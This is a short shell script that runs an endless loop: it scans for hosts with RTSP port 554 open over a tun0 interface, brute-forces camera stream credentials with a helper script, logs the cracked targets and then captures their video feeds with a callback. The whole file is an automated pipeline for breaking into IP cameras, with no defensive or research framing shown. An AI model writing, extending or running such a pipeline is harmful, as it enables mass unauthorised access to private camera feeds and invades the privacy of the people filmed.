#!/usr/bin/env sh
while true; do
    echo
    echo Gather IPs
    ./fortune_rtsp.py -c 32 -t 3 -F -i tun0
    cat local/rtsp_554.txt >> local/potential_rtsp.txt

    echo
    echo Brute
    ./rtsp_brute.py local/rtsp_554.txt \
        -i tun0 -sp > local/bruted.txt
    cat local/bruted.txt >> local/rtsp.txt

    echo
    echo Bruted:
    cat local/bruted.txt

    echo
    echo Capture
    ./rtsp_capture.py -ff local/bruted.txt -cb local/campost.sh
done

